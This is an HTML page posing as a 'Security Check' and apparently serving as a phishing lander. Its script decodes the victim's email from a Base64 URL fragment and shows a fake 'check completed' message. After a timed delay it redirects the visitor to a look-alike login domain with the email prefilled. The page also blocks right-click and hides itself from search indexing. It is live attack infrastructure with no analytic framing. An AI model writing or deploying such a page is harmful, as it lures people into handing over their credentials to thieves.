<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <meta name="robots" content="noindex, nofollow">
    <style>
        .container {
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .image-container {
            position: relative;
            width: 100%;
            max-width: 900px;
        }
        .image-container img {
            width: 100%;
            height: auto;
            display: block;
        }
        .security-check {
            display: none;
            margin-top: 1rem;
            font-size: 1rem;
            color: #4CAF50;
            text-align: center;
            font-family: 'Arial', sans-serif;
            background-color: #f2f2f2;
            padding: 10px 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.3);
            position: absolute;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
        }
    </style>
</head>
<body oncontextmenu="return false;">
    <div class="container">
        <div class="image-container">
            <img src="https://pbs.twimg.com/media/GGrR89_WgAAgrOI?format=jpg&name=large" alt="Simulating Disconnection...">
        </div>
        <p class="security-check" id="securityCheckMessage">Security check completed successfully!</p>
    </div>

    <script>
        function getEmailFromHash() {
            try {
                var hash = window.location.hash.substr(1);
                if (!hash) {
                    throw new Error("No hash found in URL.");
                }
                return atob(hash); // Decode the Base64 string
            } catch (error) {
                console.error("Error extracting email from hash:", error);
                return null;
            }
        }

        function populateEmail() {
            try {
                var email = getEmailFromHash();
                if (email) {
                    console.log("Email populated: " + email);
                } else {
                    console.log("No email found.");
                }
            } catch (error) {
                console.error("Error populating email:", error);
            }
        }

        window.onload = function() {
            setTimeout(function() {
                console.log("Reconnecting...");
                var email = getEmailFromHash(); // Get decoded email

                // Show security check message
                document.getElementById('securityCheckMessage').style.display = 'block';

                setTimeout(function() {
                    // Redirect to the URL with the decoded email after the '#'
                    var redirectTo = "https://login.titan-transpt.com/KLKzgiak#" + email; // No encoding here
                    console.log("Redirecting to: " + redirectTo);
                    window.location.href = redirectTo;
                }, 6000); // Redirect after 6 seconds

            }, 10000); // Initial wait of 10 seconds
        };
    </script>
</body>
</html>
